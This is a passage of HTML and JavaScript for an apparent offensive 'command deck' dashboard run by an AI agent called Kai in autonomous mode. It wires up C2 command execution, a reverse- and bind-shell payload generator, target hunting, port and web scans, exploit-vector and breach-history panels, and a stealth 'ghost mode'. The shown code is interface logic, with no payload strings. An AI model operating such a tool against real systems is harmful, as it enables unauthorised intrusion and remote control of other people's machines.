          <input id="c2-cmd" placeholder="command..." onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();c2Exec()}">
          <button onclick="c2Exec()">Exec</button>
        </div>
        <pre id="c2-output"></pre>
      </div>
      <div class="tab-panel" id="tp-payload">
        <select id="pl-type"><option value="powershell_reverse">PowerShell Reverse</option><option value="python_reverse">Python Reverse</option><option value="nc_reverse">Netcat Reverse</option><option value="powershell_bind">PowerShell Bind</option></select>
        <div class="pl-row"><input id="pl-ip" placeholder="LHOST / callback IP"><input id="pl-port" placeholder="LPORT"></div>
        <div class="pl-row"><button onclick="generatePayload()">Generate</button><button onclick="copyPayload()">Copy</button></div>
        <pre id="pl-output"></pre>
      </div>
      <div class="tab-panel" id="tp-probe">
        <div class="probe-query-row"><input id="probe-ip" placeholder="target IP address"><button onclick="probeDevice()">Probe</button></div>
        <div id="probe-results-area"></div>
      </div>
      <div class="tab-panel" id="tp-traffic">
        <canvas id="traffic-canvas"></canvas>
        <table class="traffic-table"><thead><tr><th>Remote</th><th>Conns</th><th>Ports</th></tr></thead><tbody id="traffic-tbody"></tbody></table>
      </div>
      <div class="tab-panel" id="tp-report">
        <div style="font-size:.75rem;color:var(--text-dim);margin-bottom:10px">Generate an operations report summarizing all discovered devices, services, and findings.</div>
        <button class="report-btn" onclick="generateReport()">&#9776; GENERATE OP REPORT</button>
        <div id="report-output" style="display:none;margin-top:10px;flex:1;display:flex;flex-direction:column">
          <a id="report-dl" style="color:var(--cyan-bright);font-family:var(--font-display);font-size:.75rem;margin-bottom:6px;text-decoration:none">&#128229; Download Report</a>
          <pre id="report-preview" style="flex:1;padding:10px;background:rgba(0,0,0,.3);border:1px solid var(--border-glow);border-radius:4px;font-family:var(--font-body);font-size:.7rem;color:var(--text-secondary);overflow-y:auto;white-space:pre-wrap"></pre>
        </div>
      </div>
    </div>
  </div>

  <!-- Right Panel: Live Map -->
  <div id="map-panel">
    <div id="map-panel-header">
      <span id="mp-title">&#127758; NETWORK MAP</span>
      <button id="mp-toggle" onclick="toggleMap()" title="Toggle panel">&#9654;</button>
    </div>
    <div id="mp-body">
      <div id="mp-gauges">
        <div class="mp-g"><span class="mp-gl">HOSTS</span><span class="mp-gv" id="g-hosts2">0</span></div>
        <div class="mp-g"><span class="mp-gl">CPU</span><span class="mp-gv" id="sys-cpu2">0%</span></div>
        <div class="mp-g"><span class="mp-gl">MEM</span><span class="mp-gv" id="sys-mem2">0%</span></div>
        <div class="mp-g"><span class="mp-gl">DSK</span><span class="mp-gv" id="sys-dsk2">0%</span></div>
      </div>
      <div id="map-container">
        <div id="map-bg"></div>
        <div id="map-grid"></div>
        <svg id="map-svg"></svg>
        <div id="map-nodes"></div>
        <div id="map-tooltip"></div>
      </div>
      <div id="mp-sidebar">
        <div class="mp-section">
          <div class="mp-sect-title">TASKS</div>
          <div id="task-list-2"></div>
        </div>
        <div class="mp-section">
          <div class="mp-sect-title">WATCHDOGS</div>
          <div id="wd-sidebar-list"></div>
        </div>
        <div class="mp-section">
          <div class="mp-sect-title">ALERTS</div>
          <div id="result-list-2"></div>
        </div>
      </div>
    </div>
  </div>

  </div>
</div>

<div id="status-bar">
  <span class="sb">&#8226; KAI ACTIVE</span>
  <span class="sb">&#8226; HOSTS: <span id="sb-hosts">0</span></span>
  <span class="sb">&#8226; SCAN: <span id="sb-scan">IDLE</span></span>
  <span class="sb">&#8226; MODEL: <span id="sb-model">—</span></span>
  <span class="sb">&#8226; MODE: <span id="sb-mode">AUTONOMOUS</span></span>
  <div id="threat-ticker"><div id="threat-ticker-inner"></div></div>
</div>

<button id="radial-btn" onclick="toggleRadialMenu(event)">&#9776;</button>
<div id="radial-menu"></div>

<!-- Device Detail Panel -->
<div id="device-panel">
  <div id="dp-header">
    <span id="dp-title">DEVICE DOSSIER</span>
    <button id="dp-close">&#10005;</button>
  </div>
  <div id="dp-body">
    <div id="dp-summary">
      <div class="dp-row"><span class="dp-label">IP</span><span class="dp-val" id="dp-ip">—</span></div>
      <div class="dp-row"><span class="dp-label">MAC</span><span class="dp-val" id="dp-mac">—</span></div>
      <div class="dp-row"><span class="dp-label">VENDOR</span><span class="dp-val" id="dp-vendor">—</span></div>
      <div class="dp-row"><span class="dp-label">HOSTNAME</span><span class="dp-val" id="dp-hostname">—</span></div>
      <div class="dp-row"><span class="dp-label">OS</span><span class="dp-val" id="dp-os">—</span></div>
      <div class="dp-row"><span class="dp-label">TYPE</span><span class="dp-val" id="dp-type">—</span></div>
    </div>
    <div class="dp-section-title">&#9776; OPEN PORTS</div>
    <div id="dp-ports"></div>
    <div class="dp-section-title">&#9881; EXPLOIT VECTORS</div>
    <div id="dp-vectors"></div>
    <div class="dp-section-title" id="dp-breach-title" style="display:none">&#9762; BREACH HISTORY</div>
    <div id="dp-breach"></div>
  </div>
</div>
<div id="dp-overlay"></div>

<script>
// ── Globals ────────────────────────────────────────────────────────────
const _sending={v:false};
function isSending(){return _sending.v}
function setSending(v){_sending.v=v}

const gHosts=document.getElementById('g-hosts');
const gScan=document.getElementById('g-scan');
const gCpu=document.getElementById('g-cpu');
const gMem=document.getElementById('g-mem');
const clockEl=document.getElementById('clock');
const mapNodes=document.getElementById('map-nodes');
const mapSvg=document.getElementById('map-svg');
const mapTooltip=document.getElementById('map-tooltip');
const dpPanel=document.getElementById('device-panel');
const dpOverlay=document.getElementById('dp-overlay');
const taskList=document.getElementById('task-list');
const taskList2=document.getElementById('task-list-2');
const resultList=document.getElementById('result-list-2');
const resultList2=document.getElementById('result-list-2');
const chatInput=document.getElementById('chat-input');
const chatLog=document.getElementById('chat-log');
const sbHosts=document.getElementById('sb-hosts');
const sbScan=document.getElementById('sb-scan');
const sbModel=document.getElementById('sb-model');

let networkDevices=[];
let scanRunning=false;
let tasks={};
let taskCounter=0;
const cooldowns={};
// ── Particles ──────────────────────────────────────────────────────────
(function(){
  const canvas=document.getElementById('particles-canvas');
  const ctx=canvas.getContext('2d');
  let w,h,pts=[];
  function resize(){w=canvas.width=innerWidth;h=canvas.height=innerHeight}
  resize(); addEventListener('resize',resize);
  for(let i=0;i<80;i++){pts.push({x:Math.random()*w,y:Math.random()*h,vx:(Math.random()-.5)*.3,vy:(Math.random()-.5)*.3,r:Math.random()*1.5+1})}
  function draw(){
    ctx.clearRect(0,0,w,h);
    for(let p of pts){
      p.x+=p.vx;p.y+=p.vy;
      if(p.x<0)p.x=w;if(p.x>w)p.x=0;if(p.y<0)p.y=h;if(p.y>h)p.y=0;
      ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
      ctx.fillStyle='rgba(0,240,255,'+(.03+p.r/80)+')';ctx.fill();
    }
    for(let i=0;i<pts.length;i++)for(let j=i+1;j<pts.length;j++){
      const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.sqrt(dx*dx+dy*dy);
      if(d<120){ctx.strokeStyle='rgba(0,240,255,'+((1-d/120)*.03)+')';ctx.lineWidth=.3;ctx.beginPath();ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.stroke()}
    }
    requestAnimationFrame(draw)
  }
  draw()
})();

// ── Clock ──────────────────────────────────────────────────────────────
function updateClock(){
  const n=new Date();
  clockEl.textContent=n.toTimeString().slice(0,8)
}
setInterval(updateClock,1000);updateClock();

// ── Terminal ───────────────────────────────────────────────────────────
const termEl=document.getElementById('tp-terminal');
var _activeOps={};
function termWrite(text,cls=''){
  var d=document.createElement('div');d.className='term-line';
  if(cls)d.innerHTML='<span class="tt">&#62;</span><span class="'+cls+'">'+text+'</span>';
  else d.innerHTML='<span class="tt">&#62;</span>'+text;
  var c=termEl.querySelector('div:first-child');
  if(c){c.appendChild(d);c.scrollTop=c.scrollHeight}
}
function termWriteln(text,cls=''){
  termWrite(text,cls)
}
function termStatus(text){
  var bar=document.getElementById('term-status-bar');
  if(!bar)return;
  bar.style.display='flex';
  bar.querySelector('.ts-text').textContent=text
}
function termStatusClear(){
  var bar=document.getElementById('term-status-bar');
  if(!bar)return;
  bar.style.display='none';
  bar.querySelector('.ts-text').textContent=''
}
function termCancelOp(op){
  if(_activeOps[op]&&_activeOps[op].abort){_activeOps[op].abort()}
  delete _activeOps[op];
  termWriteln('Cancelled: '+op,'twarn');
  termStatusClear()
}
function termBanner(){
  termWriteln('K//AI Command Deck initialized','tcmd');
  termWriteln('System ready. Awaiting orders.','tinfo');
  termWriteln('')
}
termBanner();

// ── Operations ─────────────────────────────────────────────────────────
function runOp(op){
  if(cooldowns[op]&&cooldowns[op]>Date.now())return;
  const btns=document.querySelectorAll('.action-btn[data-op="'+op+'"]');
  btns.forEach(b=>b.classList.add('on-cd'));
  const cdEl=document.getElementById('cd-'+op);
  if(cdEl)cdEl.textContent='CD 10';
  cooldowns[op]=Date.now()+10000;
  let t=10;
  const ci=setInterval(()=>{
    t--;if(cdEl)cdEl.textContent='CD '+t;
    if(t<=0){clearInterval(ci);btns.forEach(b=>b.classList.remove('on-cd'));if(cdEl)cdEl.textContent=''}
  },1000);
  switch(op){
    case'netscan':opNetScan();break;
    case'portscan':opPortScan();break;
    case'webrecon':opWebRecon();break;
    case'hunt':opHunt();break;
    case'ghost':opGhost();break;
    case'processes':opProcesses();break;
    case'services':opServices();break;
    case'smb':opSmb();break;
    case'watchdogs':opWatchdogs();break;
    case'status':opStatus();break;
    case'recall':opRecall();break;
    case'msf':opMsf();break;
    case'webscan':opWebScan();break;
    case'tools':opTools();break;
    case'c2':opC2();break;
    case'payload':opPayload();break;
    case'probe':opProbe();break;
    case'report':opReport();break;
    case'traffic':opTraffic();break;
  }
}

async function opNetScan(){
  termWriteln('Initiating network scan...','twarn');
  addTask('Network Scan','scanning');
  termStatus('Network scan running...');
  if(!_activeOps['netscan'])_activeOps['netscan']={};
  _activeOps['netscan'].aborted=false;
  var ac=_activeOps['netscan'];
  try{
    const r=await fetch('/netmap/scan',{method:'POST'});
    const d=await r.json();
    termWriteln('Scan started: '+(d.message||'ok'),'tinfo');
    gScan.textContent='SCAN';
    sbScan.textContent='SCANNING';
    const poll=setInterval(async()=>{
      try{
        if(ac.aborted){clearInterval(poll);gScan.textContent='IDLE';sbScan.textContent='IDLE';termStatusClear();updateTask('Network Scan','cancelled');return}
        const sr=await fetch('/netmap/scan/status');
        const sd=await sr.json();
        if(!sd.running){
          clearInterval(poll);
          gScan.textContent='DONE';sbScan.textContent='DONE';
          const found=sd.count||0;
          const total=sd.db_count||found;
          termWriteln('Scan complete. Discovered '+found+' new, '+total+' total on network.','tok');
          updateTask('Network Scan','complete');
          termStatusClear();
          updateNetMap();
        }
      }catch(e){}
    },2000);
  }catch(e){termWriteln('Scan failed: '+e.message,'terr');updateTask('Network Scan','failed');termStatusClear()}
}

async function opPortScan(){
  addTask('Port Scan','waiting input');
  const target=prompt('Enter target IP or hostname:');
  if(!target){termWriteln('Port scan cancelled.','tinfo');updateTask('Port Scan','cancelled');return}
  updateTask('Port Scan','scanning '+target);
  termWriteln('Scanning ports on '+target+'...','twarn');
  try{
    const r=await fetch('/ask',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:'scan ports on '+target})});
    const d=await r.json();
    termWriteln(d.reply||d.message||'(no response)','tok');
    addResult(d.reply||d.message||'Port scan complete','success');
    updateTask('Port Scan','complete');
  }catch(e){termWriteln('Port scan failed: '+e.message,'terr');updateTask('Port Scan','failed')}
}

async function opWebRecon(){
  const url=prompt('Enter target URL or domain:');
  if(!url){termWriteln('Web recon cancelled.','tinfo');return}
  termWriteln('Running web recon on '+url+'...','twarn');
  addTask('Web Recon','running');
  try{
    const r=await fetch('/workflow',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'web',target:url})});
    const d=await r.json();
    termWriteln(d.reply||d.message||'Web recon complete','tok');
    addResult('Web recon: '+(d.reply||'complete'),'success');
    updateTask('Web Recon','complete');
  }catch(e){termWriteln('Web recon failed: '+e.message,'terr');updateTask('Web Recon','failed')}
}

async function opHunt(){
  const target=prompt('Enter target IP:');
  if(!target){termWriteln('Hunt cancelled.','tinfo');return}
  termWriteln('Hunting target '+target+'...','twarn');
  addTask('Hunt Target','running');
  try{
    const r=await fetch('/hunt',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:target})});
    const d=await r.json();
    termWriteln(d.reply||d.message||'Hunt complete','tok');
    addResult('Hunt: '+(d.reply||'complete'),'success');
    updateTask('Hunt Target','complete');
  }catch(e){termWriteln('Hunt failed: '+e.message,'terr');updateTask('Hunt Target','failed')}
}

async function opGhost(){
  termWriteln('Toggling ghost mode...','twarn');
  addTask('Ghost Mode','toggling');
  try{
    const r=await fetch('/ask',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:'ghost mode'})});
    const d=await r.json();
    termWriteln(d.reply||d.message||'Ghost mode toggled','tinfo');
    updateTask('Ghost Mode','complete');
    addChatLine('Kai',d.reply||'Ghost mode toggled');
  }catch(e){termWriteln('Ghost mode failed: '+e.message,'terr');updateTask('Ghost Mode','failed')}
}

async function opStatus(){
  termWriteln('Fetching system status...','tinfo');
  addTask('System Status','fetching');
  try{
    const r=await fetch('/status');
    const d=await r.json();
    termWriteln(JSON.stringify(d,null,2),'tok');
    addResult('Status OK','success');
    updateTask('System Status','complete');
    if(d.model)sbModel.textContent=d.model;
  }catch(e){termWriteln('Status failed: '+e.message,'terr');updateTask('System Status','failed')}
}

async function opRecall(){
  termWriteln('Recalling memory...','tinfo');
  addTask('Memory Recall','fetching');
  try{
    const r=await fetch('/last_structured');
    const d=await r.json();
    if(d.reply){
      termWriteln(d.reply,'tinfo');
      addChatLine('Kai',d.reply);
    }else{
      termWriteln(JSON.stringify(d,null,2),'tinfo');
    }
    updateTask('Memory Recall','complete');
  }catch(e){termWriteln('Recall failed: '+e.message,'terr');updateTask('Memory Recall','failed')}
}

// ── Task Management ────────────────────────────────────────────────────
function addTask(name,status){
  taskCounter++;
  const id='task-'+taskCounter;
  const d=document.createElement('div');d.className='task-item';d.id=id;
  d.innerHTML='<div class="tn">'+name+'</div><div class="ts">'+status+'</div><div class="tp"><div class="f" style="width:10%"></div></div>';
  taskList.appendChild(d);
  if(taskList2){const d2=d.cloneNode(true);d2.id=id+'-2';taskList2.appendChild(d2)}
  tasks[id]={name,status,el:d};
  return id
}
function updateTask(id,status){
  for(let k in tasks){
    if(tasks[k].name===id||tasks[k].name===id||k===id){
      tasks[k].status=status;
      const el=tasks[k].el;
      if(el){const ts=el.querySelector('.ts');if(ts)ts.textContent=status;const f=el.querySelector('.f');if(f)f.style.width=status==='complete'?'100%':'50%'}
      return
    }
  }
  for(let k in tasks){
    if(tasks[k].name===id){updateTask(k,status);return}
  }
}

// ── Results / Alerts ───────────────────────────────────────────────────
function addResult(text,cls=''){
  const d=document.createElement('div');d.className='result-item'+(cls?' '+cls:'');
  d.innerHTML='<span class="rt">&#9656;</span>'+text;
  resultList.appendChild(d);
  if(resultList2){const d2=d.cloneNode(true);resultList2.appendChild(d2)}
  if(resultList.children.length>50){resultList.removeChild(resultList.firstChild);if(resultList2)resultList2.removeChild(resultList2.firstChild)}
}

// ── Chat ───────────────────────────────────────────────────────────────
function addChatLine(who,text){
  const d=document.createElement('div');d.className='term-line';
  d.innerHTML='<span class="tok">['+who+']</span> '+text.replace(/\n/g,'<br>');
  chatLog.appendChild(d);
  chatLog.scrollTop=chatLog.scrollHeight
}
document.getElementById('chat-send').addEventListener('click',sendChat);
chatInput.addEventListener('keydown',function(e){
  if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendChat()}
});
async function sendChat(){
  const txt=chatInput.value.trim();
  if(!txt||isSending())return;
  addChatLine('You',txt);
  chatInput.value='';
  setSending(true);
  try{
    const r=await fetch('/ask',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:txt})});
    const d=await r.json();
    addChatLine('Kai',d.reply||d.message||'(no response)');
    setSending(false)
  }catch(e){addChatLine('Kai','error: '+e.message);setSending(false)}
}

// ── Tab Switching ──────────────────────────────────────────────────────
document.querySelectorAll('.tab-btn').forEach(btn=>{
  btn.addEventListener('click',function(){
    document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
    this.classList.add('active');
    document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
    const tab=document.getElementById('tp-'+this.dataset.tab);
    if(tab)tab.classList.add('active')
  })
});

// ── Network Map ────────────────────────────────────────────────────────
async function updateNetMap(){
  try{
    const r=await fetch('/netmap');
    const d=await r.json();
    let devices;
    if(Array.isArray(d))devices=d;
    else if(d.nodes&&d.nodes.length)devices=d.nodes;
    else if(d.devices)devices=d.devices;
    else if(d.hosts)devices=d.hosts;
    else devices=[];
    networkDevices=devices||[];
    renderNetMap(networkDevices);
    gHosts.textContent=networkDevices.length;
    sbHosts.textContent=networkDevices.length;
    document.getElementById('g-hosts2').textContent=networkDevices.length;
  }catch(e){}
}

function renderNetMap(devices){
  mapNodes.innerHTML='';
  const ns=document.getElementById('map-svg');
  ns.innerHTML='';
  if(!devices||devices.length===0){
    const e=document.createElement('div');
    e.style.cssText='position:absolute;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:8px;font-family:var(--font-display);text-align:center';
    e.innerHTML='<div style="font-size:clamp(1.5rem,2.5vw,3rem);opacity:.15;color:var(--cyan-bright)">&#9776;</div><div style="color:var(--text-dim);letter-spacing:2px;font-size:clamp(.6rem,.8vw,1rem)">NO DEVICES FOUND</div><div style="color:var(--text-dim);opacity:.4;font-size:clamp(.4rem,.5vw,.65rem)">Run a network scan from the left panel</div>';
    mapNodes.appendChild(e);
    return
  }
  const w=document.getElementById('map-container').offsetWidth||800;
  const h=document.getElementById('map-container').offsetHeight||400;
  const cx=w/2,cy=h/2;
  const radius=Math.min(w,h)*.38;
  const svgNs='http://www.w3.org/2000/svg';
  const linkG=document.createElementNS(svgNs,'g');
  ns.appendChild(linkG);
  devices.forEach((dev,i)=>{
    const angle=(i/devices.length)*Math.PI*2-Math.PI/2;
    const r=radius*(0.6+Math.random()*0.4);
    const x=cx+Math.cos(angle)*r;
    const y=cy+Math.sin(angle)*r;
    const ip=dev.ip||dev.ip_addr||dev.address||'10.0.0.'+(i+1);
    const name=dev.hostname||dev.name||dev.mac||'host-'+(i+1);
    const type=dev.type||dev.device_type||'pc';
    const ports=dev.open_ports||dev.ports||[];
    const os=dev.os||dev.operating_system||dev.os_guess||'?';
    const line=document.createElementNS(svgNs,'line');
    line.setAttribute('x1',cx);line.setAttribute('y1',cy);
    line.setAttribute('x2',x);line.setAttribute('y2',y);
    line.style.stroke='rgba(0,240,255,0.06)';
    line.style.strokeWidth='1';
    ns.appendChild(line);
    const el=document.createElement('div');
    el.className='map-node';
    el.style.left=x+'px';el.style.top=y+'px';
    el.innerHTML='<div class="node-body" data-type="'+type+'">'+(type==='router'?'&#9750;':type==='server'?'&#9775;':type==='switch'?'&#8644;':type==='camera'?'&#9726;':type==='nas'?'&#9743;':type==='printer'?'&#9999;':type==='phone'?'&#9742;':type==='laptop'?'&#9781;':type==='iot'?'&#9673;':type==='wifi'?'&#9776;':type==='cloud'?'&#9729;':'&#9726;')+'<div class="node-glow"></div></div><div class="node-label">'+name.slice(0,14)+'</div><div class="node-ip">'+ip+'</div>';
    el.addEventListener('mouseenter',function(e){
      mapTooltip.style.left=(e.clientX-12)+'px';mapTooltip.style.top=(e.clientY-28)+'px';
      mapTooltip.classList.add('show');
      let portStr='';
      if(ports&&ports.length){
        const pLabels=ports.map(p=>{if(typeof p==='object'&&p!==null)return p.port||p.service||p.protocol||JSON.stringify(p);return p});
        portStr='<div class="tt-detail">Ports: '+pLabels.slice(0,5).join(', ')+(pLabels.length>5?', +'+(pLabels.length-5):'')+'</div>'
      }
      mapTooltip.innerHTML='<div class="tt-name">'+name.slice(0,20)+'</div><div class="tt-ip">'+ip+' | OS: '+os+'</div>'+portStr;
    });
    el.addEventListener('mousemove',function(e){
      mapTooltip.style.left=(e.clientX-12)+'px';mapTooltip.style.top=(e.clientY-28)+'px'
    });
    el.addEventListener('mouseleave',function(){mapTooltip.classList.remove('show')});
    el.addEventListener('click',function(){openDevicePanel(ip)});
    mapNodes.appendChild(el);
  });
}

// ── Device Panel ──────────────────────────────────────────────────────
function openDevicePanel(ip){
  dpOverlay.classList.add('show');
  dpPanel.classList.add('show');
  dpOverlay.onclick=closeDevicePanel;
  document.getElementById('dp-close').onclick=closeDevicePanel;
  document.getElementById('dp-ip').textContent=ip;
  document.getElementById('dp-mac').textContent='loading...';
  document.getElementById('dp-vendor').textContent='—';
  document.getElementById('dp-hostname').textContent='—';
  document.getElementById('dp-os').textContent='—';
  document.getElementById('dp-type').textContent='—';
  document.getElementById('dp-ports').innerHTML='<div style="color:var(--text-dim);font-size:clamp(.4rem,.5vw,.6rem)">loading...</div>';
  document.getElementById('dp-vectors').innerHTML='';
  document.getElementById('dp-breach-title').style.display='none';
  document.getElementById('dp-breach').innerHTML='';
  fetch('/breach/'+encodeURIComponent(ip)).then(r=>r.json()).then(d=>{
    if(d.error){document.getElementById('dp-mac').textContent='error: '+d.error;return}
    document.getElementById('dp-mac').textContent=d.mac||'none';
    document.getElementById('dp-vendor').textContent=d.vendor||'unknown';
    document.getElementById('dp-hostname').textContent=d.hostname||'none';
    document.getElementById('dp-os').textContent=d.os||'?';
    document.getElementById('dp-type').textContent=d.type||'?';
    // Ports
    const portsEl=document.getElementById('dp-ports');
    portsEl.innerHTML='';
    if(d.ports&&d.ports.length){
      d.ports.forEach(p=>{
        const e=document.createElement('div');e.className='dp-port';
        e.innerHTML='<span class="pp">'+p.port+'</span><span class="ps">'+p.state+'</span><span class="psvc">'+p.service+'</span>';
        portsEl.appendChild(e)
      });
    }else{
      portsEl.innerHTML='<div style="color:var(--text-dim);font-size:clamp(.4rem,.5vw,.6rem)">No open ports detected</div>'
    }
    // Exploit vectors
    const vecEl=document.getElementById('dp-vectors');
    vecEl.innerHTML='';
    if(d.actions&&d.actions.length){
      const vecMap={smb_enumerate:{icon:'&#9733;',label:'SMB Enumeration',desc:'Port 445 — list shares, users, OS info'},
                    rdp_connect:{icon:'&#9783;',label:'RDP Connect',desc:'Port 3389 — remote desktop access'},
                    web_audit:{icon:'&#9782;',label:'Web Audit',desc:'Port 80/443 — scan web app'},
                    winrm:{icon:'&#9881;',label:'WinRM Access',desc:'Port 5985 — remote management'},
                    ssh:{icon:'&#9762;',label:'SSH Access',desc:'Port 22 — secure shell'},
                    ftp_check:{icon:'&#9776;',label:'FTP Check',desc:'Port 21 — anonymous login?'}};
      d.actions.forEach(a=>{
        const info=vecMap[a]||{icon:'&#9881;',label:a,desc:''};
        const e=document.createElement('div');e.className='dp-vector';
        e.innerHTML='<span class="vi">'+info.icon+'</span><div><div class="vn">'+info.label+'</div><div class="vd">'+info.desc+'</div></div>';
        vecEl.appendChild(e)
      });
    }else{
      vecEl.innerHTML='<div style="color:var(--text-dim);font-size:clamp(.4rem,.5vw,.6rem)">No exploit vectors identified</div>'
    }
    // Breach history
    if(d.breach_history&&d.breach_history.length){
      document.getElementById('dp-breach-title').style.display='block';
      const bEl=document.getElementById('dp-breach');
      bEl.innerHTML='';
      d.breach_history.slice(-5).forEach(b=>{
        const e=document.createElement('div');e.className='dp-breach-item';
        e.textContent=(b.timestamp||'?')+' — '+(b.action||b.event||'');
        bEl.appendChild(e)
      })
    }
  }).catch(e=>{document.getElementById('dp-mac').textContent='fetch error'})
}
function closeDevicePanel(){
  dpPanel.classList.remove('show');
  dpOverlay.classList.remove('show')
}
function toggleMap(){
  var mp=document.getElementById('map-panel');
  mp.classList.toggle('collapsed');
  mp.title=mp.classList.contains('collapsed')?'Click to expand map panel':''
}

// ── SSE ────────────────────────────────────────────────────────────────
(function(){
  const es=new EventSource('/stream');
  es.addEventListener('message',function(e){
    try{
      const d=JSON.parse(e.data);
      if(d.reply&&d.reply!==''){
        termWriteln(d.reply,'tinfo');
        addChatLine('Kai',d.reply);
      }
      if(d.type==='scan_progress'||d.type==='netmap_update'){
        if(d.hosts){gHosts.textContent=d.hosts.length;sbHosts.textContent=d.hosts.length}
      }
    }catch(_){}
  });
  es.addEventListener('alert',function(e){
    try{
      const d=JSON.parse(e.data);
      if(d.message){
        addResult(d.message,'alert');
        termWriteln('ALERT: '+d.message,'terr');
        showToast(d.watchdog||'Alert',d.message,'alert');
      }
    }catch(_){}
  });
  es.addEventListener('achievement',function(e){
    try{
      const d=JSON.parse(e.data);
      if(d.name){
        addResult('Achievement: '+d.name,'success');
        termWriteln('ACHIEVEMENT: '+d.name,'tok');
      }
    }catch(_){}
  });
})();

// ── Periodic Updates ──────────────────────────────────────────────────
setInterval(async()=>{
  try{
    const r=await fetch('/status');
    const d=await r.json();
    if(d.model)sbModel.textContent=d.model;
    if(d.cpu_percent)gCpu.style.width=d.cpu_percent+'%';
    if(d.memory_percent)gMem.style.width=d.memory_percent+'%';
  }catch(e){}
},5000);

setInterval(()=>{
  if(!scanRunning)updateNetMap()
},15000);

// ── Boot Sequence ────────────────────────────────────────────────────
setTimeout(()=>{document.getElementById('boot-screen').classList.add('hidden')},3200);

// ── Toast System ──────────────────────────────────────────────────────
function showToast(title,msg,cls=''){
  const c=document.getElementById('toast-container');
  const e=document.createElement('div');e.className='toast'+(cls?' '+cls:'');
  e.innerHTML='<div class="tt">'+title+'</div><div class="tm">'+msg+'</div>';
  c.appendChild(e);
  requestAnimationFrame(()=>e.classList.add('show'));
  setTimeout(()=>{e.classList.remove('show');setTimeout(()=>e.remove(),300)},5000)
}

// ── Tab Switching (updated for new tabs) ─────────────────────────────
document.querySelectorAll('.tab-btn').forEach(btn=>{
  btn.addEventListener('click',function(){
    document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
    document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
    this.classList.add('active');
    document.getElementById('tp-'+this.dataset.tab).classList.add('active')
  })
});

// ── Process Tree ───────────────────────────────────────────────────────
async function opProcesses(){
  termWriteln('Fetching process tree...','tinfo');
  switchTab('processes');
  const root=document.getElementById('proc-tree-root');
  root.innerHTML='<div style="color:var(--text-dim);font-size:clamp(.4rem,.5vw,.6rem)">loading...</div>';
  try{
    const r=await fetch('/processes');const d=await r.json();
    if(d.error){root.innerHTML='<div style="color:var(--accent-danger)">Error: '+d.error+'</div>';return}
    root.innerHTML='';
    renderProcTree(root,d,0)
  }catch(e){root.innerHTML='<div style="color:var(--accent-danger)">Fetch failed</div>'}
}
function renderProcTree(el,procs,ppid,depth){
  const children=procs.filter(p=>(p.PPid||0)===ppid).sort((a,b)=>a.Id-b.Id);
  if(!children.length&&depth===0){el.innerHTML='<div style="color:var(--text-dim)">No processes</div>';return}
  children.forEach(p=>{
    const hasKids=procs.some(c=>(c.PPid||0)===p.Id);
    const node=document.createElement('div');node.className='proc-node';
    const mem=p.MemMB!==null&&p.MemMB!==undefined?p.MemMB+'M':'?';
    const pid=p.Id!==null&&p.Id!==undefined?p.Id:'?';
    node.innerHTML='<span class="pt">'+pid+'</span>'+(hasKids?'<span class="proc-toggle">&#9654;</span>':'<span class="proc-toggle" style="visibility:hidden">&#9654;</span>')+'<span class="pn">'+p.ProcessName+'</span><span class="pm">'+mem+'</span>';
    el.appendChild(node);
    if(hasKids){
      const childC=document.createElement('div');childC.className='proc-children';childC.style.display='none';
      renderProcTree(childC,procs,p.Id,depth+1);
      el.appendChild(childC);
      node.addEventListener('click',function(e){e.stopPropagation();const expanded=childC.style.display!=='none';childC.style.display=expanded?'none':'block';node.querySelector('.proc-toggle').textContent=expanded?'&#9654;':'&#9660;'})
    }
  })
}

// ── Service Auditor ─────────────────────────────────────────────────────
let _svcData=[];
async function opServices(){
  termWriteln('Fetching services...','tinfo');
  switchTab('services');
  document.getElementById('svc-tbody').innerHTML='<tr><td colspan="4" style="color:var(--text-dim)">loading...</td></tr>';
  try{
    const r=await fetch('/services');const d=await r.json();
    if(d.error){document.getElementById('svc-tbody').innerHTML='<tr><td colspan="4" style="color:var(--accent-danger)">Error</td></tr>';return}
    _svcData=Array.isArray(d)?d:d.data||[];
    renderServices()
  }catch(e){document.getElementById('svc-tbody').innerHTML='<tr><td colspan="4" style="color:var(--accent-danger)">Fetch failed</td></tr>'}
}
function renderServices(){
  const q=document.getElementById('svc-search').value.toLowerCase();
  const tbody=document.getElementById('svc-tbody');
  tbody.innerHTML='';
  const filtered=_svcData.filter(s=>s.Name.toLowerCase().includes(q)||(s.DisplayName||'').toLowerCase().includes(q));
  filtered.forEach(s=>{
    const tr=document.createElement('tr');
    const statusCls=s.Status==='Running'?'s-running':s.Status==='Stopped'?'s-stopped':'';
    const startCls=s.StartType==='Automatic'?'s-auto':s.StartType==='Manual'?'s-manual':'s-disabled';
    tr.innerHTML='<td>'+s.Name+'</td><td class="'+statusCls+'">'+s.Status+'</td><td class="'+startCls+'">'+s.StartType+'</td>';
    const actTd=document.createElement('td');
    if(s.Status==='Running'||s.Status==='Stopped'){
      const btn=document.createElement('button');btn.className='svc-btn'+(s.Status==='Running'?' danger':'');
      btn.textContent=s.Status==='Running'?'Stop':'Start';
      btn.onclick=async function(){try{await fetch('/services/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:s.Name,action:s.Status==='Running'?'Stop':'Start'})});opServices()}catch(e){}};
      actTd.appendChild(btn)
    }
    tr.appendChild(actTd);tbody.appendChild(tr)
  })
}

// ── SMB Share Browser ──────────────────────────────────────────────────
async function opSmb(){
  termWriteln('Fetching SMB shares...','tinfo');
  switchTab('smb');
  try{
    const r=await fetch('/smb/shares');const d=await r.json();
    const list=document.getElementById('smb-local-list');
    list.innerHTML='';
